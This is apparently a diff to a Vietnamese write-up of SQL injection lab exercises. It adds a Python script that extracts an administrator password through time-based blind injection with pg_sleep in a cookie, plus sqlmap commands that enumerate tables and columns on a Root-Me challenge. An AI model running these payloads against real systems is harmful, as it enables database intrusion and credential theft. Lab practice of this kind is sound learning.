@@ -256,6 +256,33 @@ Ta tìm được độ dài của password là 20. Tiếp tục cho vào burp in
 
 > Vậy password của administrator trong bài lab là: aon10t6tnj02e4sfpb7u
 
+## Ta cũng có thể dùng payload để fuzz password như sau: 
+
+```
+import requests
+import string
+import time
+sess=requests.Session()
+url='https://0a9a006303436b6bc1972c7d00e200c1.web-security-academy.net/filter?category=Gifts'
+payload=string.printable
+passwd=''   
+i=1
+for i in range(1,21):
+    for c in payload: 
+        cookie = {
+            'session':'x4WtkaDb1urcznArHcddDzYJP8ACEMM1',
+            'TracingId':f"szEoh7OiaOya7XuR'%3B select case when(substr((select password from users where username='administrator'),{i},1)='{c}') then pg_sleep(5) else pg_sleep(0) end -- - "
+        }
+        start = time.time()
+        r=sess.post(url,data=cookie)
+        end = time.time()
+        if end - start > 2:
+            passwd+=c
+            print(passwd)
+            break
+ ```
+ 
+
 
 Tương tự ta dùng sqlmap để giải: 
 
@@ -375,5 +402,18 @@ while True:
 
 
 ### Bài này ta cũng có thể dùng sqlmap để tìm kiếm: 
+
+Đầu tiên payload tìm tables:
+
+> sqlmap -u 'http://challenge01.root-me.org/web-serveur/ch10/' --dbms=SQLite --data='username=x&password=x' --tables --threads=10 --batch
+
+![image](https://user-images.githubusercontent.com/104350480/221760199-90300407-e072-46d4-aee2-03cd556280c6.png)
+
+Payload tìm columns:
+
+> sqlmap -u 'http://challenge01.root-me.org/web-serveur/ch10/' --dbms=SQLite --data='username=x&password=x' -T users --columns --threads=10 --batch 
+
+
+
 
 
